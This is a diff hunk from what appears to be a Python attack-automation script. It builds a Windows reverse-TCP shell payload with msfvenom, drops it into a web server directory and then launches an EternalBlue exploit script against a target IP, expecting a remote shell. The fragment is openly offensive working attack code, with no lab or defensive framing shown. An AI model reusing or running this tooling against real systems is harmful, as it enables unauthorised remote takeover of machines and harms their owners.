@@ -30,7 +30,7 @@ while True:
         #payload = input.() --- -- This will need some work with SED or something similar - or just echo in the payload code?
         os.system('rm -rm /var/www/html/sc.exe')
         #Removing old listener, and adding  new one to web server
-        os.system('msfvenom -p windows/shell/reverse_tcp LHOST='listenIP' LPORT='listenPORT' -i 10 -f exe > /var/www/html/sc.exe')
+        os.system('msfvenom -p windows/shell/reverse_tcp LHOST=' + listenIP + ' LPORT=' + listenPORT + ' -i 10 -f exe > /var/www/html/sc.exe')
 	# running exploit
         os.system('python2 Modules/attack/exploits/Eternal_Blue_7/eternalblue.py ' + targetIP)
         print('\n -- If the exploit completed correctly, a shell should appear below -- \n')
